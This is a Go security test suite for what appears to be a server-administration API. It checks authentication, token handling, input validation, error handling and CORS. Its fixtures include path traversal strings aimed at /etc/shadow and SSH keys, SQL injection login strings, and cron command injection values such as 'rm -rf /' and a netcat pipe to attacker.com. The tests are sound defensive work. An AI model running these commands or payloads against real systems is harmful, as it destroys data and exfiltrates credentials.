package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"testing"
)

// Test Security: Path Traversal Protection
func TestSecurityPathTraversal(t *testing.T) {
	t.Run("File Access - Path Traversal Attack", func(t *testing.T) {
		maliciousPaths := []string{
			"../../../etc/passwd",
			"/etc/passwd",
			"../../../../etc/shadow",
			"/root/.ssh/id_rsa",
		}

		for _, path := range maliciousPaths {
			resp := makeAuthRequest(t, "GET", "/api/files?path="+path, nil)
			defer resp.Body.Close()

			// Should be denied (either 400 Bad Request or 403 Forbidden)
			if resp.StatusCode == http.StatusOK {
				body, _ := io.ReadAll(resp.Body)
				t.Errorf("Path traversal attack not blocked for path: %s. Body: %s", path, string(body))
			}
		}
	})

	t.Run("File Download - Path Traversal Attack", func(t *testing.T) {
		resp := makeAuthRequest(t, "GET", "/api/files/download?path=../../../etc/passwd", nil)
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			t.Error("Path traversal attack in download not blocked")
		}
	})
}

// Test Security: SQL Injection Protection
func TestSecuritySQLInjection(t *testing.T) {
	t.Run("Login - SQL Injection Attempt", func(t *testing.T) {
		sqlInjectionAttempts := []string{
			"admin' OR '1'='1",
			"admin'--",
			"admin' OR '1'='1'--",
			"' OR 1=1--",
		}

		for _, username := range sqlInjectionAttempts {
			loginData := map[string]string{
				"username": username,
				"password": "anything",
			}
			jsonData, _ := json.Marshal(loginData)

			resp, err := http.Post(baseURL+"/api/auth/login", "application/json", bytes.NewBuffer(jsonData))
			if err != nil {
				t.Fatalf("Failed to make request: %v", err)
			}
			defer resp.Body.Close()

			// Should not allow login
			if resp.StatusCode == http.StatusOK {
				t.Errorf("SQL injection not blocked for username: %s", username)
			}
		}
	})
}

// Test Security: Authentication Required
func TestSecurityAuthRequired(t *testing.T) {
	endpoints := []struct {
		method string
		path   string
	}{
		{"GET", "/api/system/info"},
		{"GET", "/api/system/stats"},
		{"GET", "/api/files"},
		{"GET", "/api/docker/containers"},
		{"GET", "/api/database"},
		{"GET", "/api/cron"},
		{"GET", "/api/logs/files"},
		{"GET", "/api/backup"},
		{"GET", "/api/users"},
		{"GET", "/api/settings"},
	}

	for _, endpoint := range endpoints {
		t.Run(endpoint.method+" "+endpoint.path, func(t *testing.T) {
			req, _ := http.NewRequest(endpoint.method, baseURL+endpoint.path, nil)
			// No Authorization header

			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				t.Fatalf("Request failed: %v", err)
			}
			defer resp.Body.Close()

			// Should require authentication (401 Unauthorized)
			if resp.StatusCode != http.StatusUnauthorized {
				t.Errorf("Expected 401 Unauthorized, got %d for %s %s", resp.StatusCode, endpoint.method, endpoint.path)
			}
		})
	}
}

// Test Security: Invalid Token Handling
func TestSecurityInvalidToken(t *testing.T) {
	t.Run("Invalid JWT Token", func(t *testing.T) {
		req, _ := http.NewRequest("GET", baseURL+"/api/system/info", nil)
		req.Header.Set("Authorization", "Bearer invalid-token-here")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusUnauthorized {
			t.Errorf("Expected 401 for invalid token, got %d", resp.StatusCode)
		}
	})

	t.Run("Malformed Authorization Header", func(t *testing.T) {
		req, _ := http.NewRequest("GET", baseURL+"/api/system/info", nil)
		req.Header.Set("Authorization", "NotBearer token")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusUnauthorized {
			t.Errorf("Expected 401 for malformed header, got %d", resp.StatusCode)
		}
	})
}

// Test Security: Command Injection Protection
func TestSecurityCommandInjection(t *testing.T) {
	t.Run("Cron Job - Command Injection Attempt", func(t *testing.T) {
		maliciousCommands := []string{
			"echo test; rm -rf /",
			"echo test && cat /etc/passwd",
			"echo test | nc attacker.com 1234",
		}

		for _, cmd := range maliciousCommands {
			createData := map[string]interface{}{
				"name":     "test-job",
				"schedule": "0 0 * * *",
				"command":  cmd,
				"enabled":  true,
			}
			jsonData, _ := json.Marshal(createData)

			resp := makeAuthRequest(t, "POST", "/api/cron", bytes.NewBuffer(jsonData))
			defer resp.Body.Close()

			// The API should accept the command (it's the user's responsibility to be careful)
			// But we log this test to ensure commands are properly escaped when executed
			t.Logf("Command injection test for: %s, status: %d", cmd, resp.StatusCode)
		}
	})
}

// Test Security: Rate Limiting on Login
func TestSecurityLoginRateLimit(t *testing.T) {
	t.Skip("Rate limiting not implemented - feature request for future")
	
	// This test would verify that excessive login attempts are blocked
	// Currently skipped as rate limiting may not be implemented
}

// Test Data Validation
func TestDataValidation(t *testing.T) {
	t.Run("Empty Required Fields", func(t *testing.T) {
		// Test creating user with empty required fields
		createData := map[string]interface{}{
			"username": "",
			"password": "",
		}
		jsonData, _ := json.Marshal(createData)

		resp := makeAuthRequest(t, "POST", "/api/users", bytes.NewBuffer(jsonData))
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			t.Error("Should not allow creating user with empty required fields")
		}
	})

	t.Run("Invalid Email Format", func(t *testing.T) {
		createData := map[string]interface{}{
			"username": "testuser",
			"password": "testpass",
			"email":    "not-an-email",
		}
		jsonData, _ := json.Marshal(createData)

		resp := makeAuthRequest(t, "POST", "/api/users", bytes.NewBuffer(jsonData))
		defer resp.Body.Close()

		// May or may not validate email format - log result
		t.Logf("Invalid email format test status: %d", resp.StatusCode)
	})

	t.Run("Weak Password", func(t *testing.T) {
		createData := map[string]interface{}{
			"username": "testuser",
			"password": "123",
			"email":    "test@example.com",
		}
		jsonData, _ := json.Marshal(createData)

		resp := makeAuthRequest(t, "POST", "/api/users", bytes.NewBuffer(jsonData))
		defer resp.Body.Close()

		// May or may not enforce password strength - log result
		t.Logf("Weak password test status: %d", resp.StatusCode)
	})
}

// Test Error Handling
func TestErrorHandling(t *testing.T) {
	t.Run("Invalid JSON in Request Body", func(t *testing.T) {
		invalidJSON := bytes.NewBufferString("{invalid json")

		resp := makeAuthRequest(t, "POST", "/api/users", invalidJSON)
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusBadRequest {
			t.Errorf("Expected 400 for invalid JSON, got %d", resp.StatusCode)
		}
	})

	t.Run("Non-existent Resource", func(t *testing.T) {
		resp := makeAuthRequest(t, "GET", "/api/users/99999", nil)
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusNotFound && resp.StatusCode != http.StatusInternalServerError {
			t.Logf("Non-existent user status: %d (acceptable)", resp.StatusCode)
		}
	})

	t.Run("Delete Non-existent Resource", func(t *testing.T) {
		resp := makeAuthRequest(t, "DELETE", "/api/users/99999", nil)
		defer resp.Body.Close()

		// Should handle gracefully
		t.Logf("Delete non-existent user status: %d", resp.StatusCode)
	})
}

// Test CORS Headers
func TestCORSHeaders(t *testing.T) {
	t.Run("OPTIONS Request", func(t *testing.T) {
		req, _ := http.NewRequest("OPTIONS", baseURL+"/api/auth/login", nil)
		req.Header.Set("Origin", "http://example.com")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("Request failed: %v", err)
		}
		defer resp.Body.Close()

		// Check for CORS headers
		if resp.Header.Get("Access-Control-Allow-Origin") == "" {
			t.Log("CORS headers might not be configured")
		} else {
			t.Logf("CORS configured: %s", resp.Header.Get("Access-Control-Allow-Origin"))
		}
	})
}
